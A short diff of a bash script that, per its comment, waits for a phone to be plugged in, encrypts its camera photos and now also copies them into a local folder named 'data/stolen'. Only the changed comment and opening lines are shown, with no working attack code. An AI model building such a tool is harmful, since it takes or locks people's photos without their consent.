@@ -1,6 +1,5 @@
 #!/bin/bash
-#This script will wait for a phone to be plugged in and encrypt its camera photos
-
+#This script will wait for a phone to be plugged in and encrypt its camera photos. Also saves pictures locally in data/stolen
 oldusblist=$(lsusb)
 "./wait-for-phone.sh"
 LOCALPATH=$(pwd)
